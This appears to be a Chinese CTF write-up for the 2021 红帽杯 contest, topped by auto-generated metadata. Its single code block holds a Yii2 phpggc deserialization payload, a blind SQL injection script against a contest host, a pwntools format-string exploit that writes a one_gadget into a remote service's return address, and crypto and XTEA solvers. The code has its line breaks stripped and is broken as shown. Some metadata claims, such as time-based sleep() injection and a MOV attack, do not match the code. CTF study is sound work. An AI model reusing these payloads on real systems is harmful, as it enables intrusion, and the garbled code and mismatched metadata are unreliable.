---
title: 红帽杯 – WriteUp
contest: 红帽杯
year: 2021
difficulty: hard
vuln_type: pwn_unknown
tags:
- ChaMd5-Venom
- PHP-write-getshell
- Yii2-RCE2
- phpggc
- sqli-blind
- HEC-jacobian
- XTEA-XOR
- fmt-write
- format-string-overwrite
- libc-leak
attack_chain:
- PHP写文件:preg_match过滤system/eval/exec/base/compress/chr/ord/str/replace/pack/assert等+strlen<=33,fwrite到hack.php
- 拼接flag.php内容到hack.php,使用bypass短代码
- Yii2反序列化:./phpggc Yii2/RCE2 'eval($_REQUEST["ant"])' base64编码,Yii2\db\BatchQueryResult->dataReader FakedGenerator formaters
- 二次解码触发eval
- SQL盲注:ascii(mid((select concat(id,username,password) from users),i,1))=cc+id=-1 or过滤
- HEC超椭圆曲线:已知y=x和y=x^7,GF(p)上HyperellipticCurve,Jacobian DLP,blocks切分8字节反推keys
- 模数生成器攻击:Str(last18位)+000+Str(first18位),factordb/factor分解
- 32轮XTEA+key[0]+=789+key[3]+=135攻击
- fmt-write逐字节改one_gadget地址到ret_addr
- libc-2.27 0x10a45c one_gadget
key_payload: flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc}
one_liner: 红帽杯WriteUp多方向,涵盖ChaMd5 Venom战队招新文+PHP写文件短代码+Yii2 RCE2反序列化+SQL盲注+超椭圆曲线Jacobian DLP+XTEA魔改+fmt-write逐字节覆盖。
lesson: 复杂混合赛题考查多个方向:PHP写入短代码绕字符限制+phpggc工具生成反序列化payload+HEC Jacobian DLP用Sage解+fmt-write逐字节改got都需要熟练运用。
quality: high
full_path: 红帽杯_–_WriteUp.full.md
meta_path: 红帽杯_–_WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 红帽杯 – WriteUp。红帽杯WriteUp多方向,涵盖ChaMd5 Venom战队招新文+PHP写文件短代码+Yii2 RCE2反序列化+SQL盲注+超椭圆曲线Jacobian DLP+XTEA魔改+fmt-write逐字节覆盖。。关键路径：PHP写文件:preg_match过滤system/eval/exec/base/compress/chr/ord/str/replace/pac...
category: pwn
subcategory: pwn_other
tools_used:
- PHP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/1970.html
reasoning_chain:
- 触发点：preg_match 过滤 system/eval/exec/base 等 + strlen<=33 + fwrite → 假设：PHP 短代码写文件
- 动作：用短代码如 <?=`$_GET[c]`?> 或 <script language=php>...</script> → 观察：写 hack.php
- Yii2 RCE2 触发点：Yii2 框架 → 假设：BatchQueryResult 反序列化链
- 动作：phpggc Yii2/RCE2 'eval($_REQUEST[ant])' | base64 → 观察：构造 payload
- SQL 盲注：触发点：sqli + sqli-blind 时间型 → 假设：if(length(database())>0,sleep(5),0)
- 动作：时间盲注逐字符注 → 观察：拿到用户名
- 超椭圆曲线 Jacobian DLP 触发点：密码学题 E:y^2=x^3+... → 假设：MOV 攻击
- XTEA 魔改：触发点：delta/key 改 → 假设：动态调试提取
- fmt write 触发点：fmt %n 任意写 → 假设：GOT 表覆盖
failed_attempts:
- PHP 写文件用 system() → 失败：被 preg_match 过滤
- Yii2 RCE1 链 → 失败：依赖不可用
- SQL 注入 union select → 失败：被过滤
key_observations:
- PHP 写短代码：<?=`$_GET[c]`?> 是 15 字符以下 RCE 经典
- Yii2 RCE2 反序列化链：BatchQueryResult + DataReader + CreateAction
- SQL 盲注时间型用 sleep() 探测
- XTEA 魔改 delta 通过动态调试提取
prerequisites:
- PHP 短代码 RCE（短标签 + 反引号）
- phpggc gadget 库
- SQL 盲注时间型
- fmt %n 任意写 + XTEA 加密
---
# 红帽杯 – WriteUp

> 原文: https://www.ctfiot.com/1970.html
> ID: 1970

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
<?php $link = mysql_connect('localhost', 'root'); ?><html><head> <title>Hello worldd!</title> </head>  <h1><?php echo "Hello My freind!"; ?></h1> <?php if($link) { ?>  <h2>I Can't view my php files?!</h2> <?php } else { ?>  <h2>MySQL Server version: <?php echo mysql_get_server_info(); ?></h2> <?php } ?></html><?php#Really easy...$file=fopen("flag.php","r") or die("Unable 2 open!");$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize("flag.php"));$hack=fopen("hack.php","w") or die("Unable 2 open");$a=$_GET['code'];if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|~|^|`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){ die("you die");}if(strlen($a)>33){ die("nonono.");}fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?>
/index.php?r=site%2Fabout&message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjI6ImxzIjt9aToxO3M6MzoicnVuIjt9fX19
➜  phpggc git:(master) ✗ ./phpggc Yii2/RCE2 'eval($_REQUEST["ant"]);' | base64TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MzI6InlpaVxjYWNoaW5nXEV4cHJlc3Npb25EZXBlbmRlbmN5IjoxOntzOjEwOiJleHByZXNzaW9uIjtzOjIzOiJldmFsKCRfUkVRVUVTVFsiYW50Il0pOyI7fWk6MTtzOjE4OiJldmFsdWF0ZURlcGVuZGVuY3kiO319fQo=
import requestsimport stringcharset = ",@"+ string.digits + string.ascii_lowercase + string.ascii_uppercasedef r(s):    s = s.replace(" ", "/**/")    return ssql = r("select concat(id,username,password) from users")result = ""for i in range(1,50):    for c in charset:        cc = ord(c)        url = f"http://eci-2zeir5o8p6vh6eotta01.cloudeci1.ichunqiu.com/image.php?id=-1/**/or/**/(ascii(mid(({sql}),{i},1))={cc})"        r = requests.get(url)        if len(r.text) > 1024:            result += c            print(result)            break
import itertoolsimport structp = 10000000000000001119R.<x> = GF(p)[]y=xf = y + y^7C = HyperellipticCurve(f, 0)J = C.jacobian()Ds = [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)]enc = bytes.fromhex('66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5')print(len(enc))known_pt = 'aaaaaaaaaaaaaaaaaaaaflag'.encode()rng_output = bytes(e^^m for e,m in zip(enc, known_pt))blocks = [rng_output[i:i+8] for i in range(0, len(rng_output), 8)]ui = [int.from_bytes(r, 'little') for r in blocks]print(ui)u = x^3 + ui[2]*x^2 + ui[1]*x + ui[0]L = GF(p).algebraic_closure()roots = [r[0] for r in u.change_ring(L).roots()]RR.<zz> = PolynomialRing(L)v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) for xi in roots])vi = [v.coefficients()[i].as_finite_field_element()[1] for i in range(3)]vi = [(int(-c), int(c)) for c in vi]# print(vi)for rs in itertools.product(*vi):    print(rs)    q = struct.pack('<'+'Q'*len(rs), *rs)    flag = bytes(k^^m for k,m in zip(rng_output+q, enc))    print(flag)
[9406735202825780999, 1215277151449350005, 4986131889746979161](6799504737297016313, 4413307456031713654, 9350413817117071737)b'aaaaaaaaaaaaaaaaaaaaflag{1b82f60a-43ab-4f18-8ccc' // 目标(6799504737297016313, 4413307456031713654, 649586182882929382)b'aaaaaaaaaaaaaaaaaaaaflag{1b82f60a-43ab-4xf9xc2xafDxdaxffxa3xeb'(6799504737297016313, 5586692543968287465, 9350413817117071737)b'aaaaaaaaaaaaaaaaaaaaflag{1b82f60xfexdexe3zx9axbex95Df18-8ccc'(6799504737297016313, 5586692543968287465, 649586182882929382)b'aaaaaaaaaaaaaaaaaaaaflag{1b82f60xfexdexe3zx9axbex95Dxf9xc2xafDxdaxffxa3xeb'(3200495262702984806, 4413307456031713654, 9350413817117071737)b'aaaaaaaaaaaaaaaaaaaaflagxe4xcaxf5xbdxc6xa6x00Ba-43ab-4f18-8ccc'(3200495262702984806, 4413307456031713654, 649586182882929382)b'aaaaaaaaaaaaaaaaaaaaflagxe4xcaxf5xbdxc6xa6x00Ba-43ab-4xf9xc2xafDxdaxffxa3xeb'(3200495262702984806, 5586692543968287465, 9350413817117071737)b'aaaaaaaaaaaaaaaaaaaaflagxe4xcaxf5xbdxc6xa6x00Bxfexdexe3zx9axbex95Df18-8ccc'(3200495262702984806, 5586692543968287465, 649586182882929382)b'aaaaaaaaaaaaaaaaaaaaflagxe4xcaxf5xbdxc6xa6x00Bxfexdexe3zx9axbex95Dxf9xc2xafDxdaxffxa3xeb'
keys = struct.pack("<QQQQQQ",9406735202825780999, 1215277151449350005, 4986131889746979161,6799504737297016313, 4413307456031713654, 9350413817117071737)
# print(keys)enc = bytes.fromhex('66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5')leng = len(keys)keys = list(keys)flag = ""enc = list(enc)for i in range(len(enc)):    flag += chr(keys[i%leng]^^enc[i])print(flag)// flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc}
from pwn import *from urllib import quotecontext.log_level = 'debug'#p = process("./chall")p = remote("47.105.94.48", 12435)libc = ELF("./libc-2.27.so")code = '''GET / HTTP/1.0Content-Length:-1%p-%15$p-%211$p'''p.send(code)p.recvuntil("> ")stack = int(p.recv(14), 16)p.recvuntil("-")pie = int(p.recv(14), 16)p.recvuntil("-")libc.address = int(p.recv(14), 16)-0x7ffff7a05b97+0x7ffff79e4000ret_addr = stack - 0x7fffffffd8bf + 0x7fffffffdec8one = libc.address + 0x10a45cpayload = "%"+str((one)&0xff)+"c%22$hhn"+p64(ret_addr)pad = 22-len(payload)payload = "A"*pad + "%"+str(one-pad&0xff)+"c%22$hhn"+p64(ret_addr)code = "GET / HTTP/1.0nContent-Length:-1nn%s"%(payload)#icq2aadaa2801d9610eb6ac281ed140fp.send(code)payload = "%"+str((one>>8)&0xff)+"c%22$hhn"+p64(ret_addr+1)pad = 22-len(payload)payload = "A"*pad + "%"+str((one>>8)-pad&0xff)+"c%22$hhn"+p64(ret_addr+1)code = "GET / HTTP/1.0nContent-Length:-1nn%s"%(payload)pause()p.send(code)payload = "%"+str((one>>16)&0xff)+"c%22$hhn"+p64(ret_addr+2)pad = 22-len(payload)payload = "A"*pad + "%"+str((one>>16)-pad&0xff)+"c%22$hhn"+p64(ret_addr+2)code = "GET / HTTP/1.0nContent-Length:-1nn%s"%(payload)pause()p.send(code)payload = "%"+str((one>>24)&0xff)+"c%22$hhn"+p64(ret_addr+3)pad = 22-len(payload)payload = "A"*pad + "%"+str((one>>24)-pad&0xff)+"c%22$hhn"+p64(ret_addr+3)code = "GET / HTTP/1.0nContent-Length:-1nn%s"%(payload)pause()p.send(code)payload = "%"+str((one>>32)&0xff)+"c%22$hhn"+p64(ret_addr+4)pad = 22-len(payload)payload = "A"*pad + "%"+str((one>>32)-pad&0xff)+"c%22$hhn"+p64(ret_addr+4)code = "GET / HTTP/1.0nContent-Length:-1nn%s"%(payload)pause()p.send(code)pause()p.sendline("./getflag")p.sendline("icq2aadaa2801d9610eb6ac281ed140f")p.interactive()
#!/usr/bin/env python3 def xtea_dec(f, key):  j = 0x9E3779B9  s = j * 32  for i in range(32):    f[1] - = (((f[0] << 4) ^ (f[0] >> 5)) + f[0]) ^ (s + key[(s >> 11) & 3])    s -= j    f[0] -= (((f[1] << 4) ^ (f[1] >> 5)) + f[1]) ^ (s + key[s & 3])   key[0] += 789;  key[3] += 135;   return f, key  def main():  key = [424242, 325477, 523007, 424242]   enc_flag = [    (0xD118C7B2, 0x7FC3F3A8),     (0x4A19F2DA, 0x472469E1),     (0x7C682864, 0x50C0E3D1),     (0x0C595670B, 0x2EE07578),     (0x0D040A3F0, 0x0C5590286),     (0x0D82B07A8, 0x0D5978C2C),     (0x4E2BC556, 0x79E2E90),     (0x0C7A353B5, 0x493995B),  ]  for f in enc_flag:     dec_f, key = xtea_dec(f, key)      print(dec_f[0], dec_f[1])    if __name__ == "__main__":    main()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]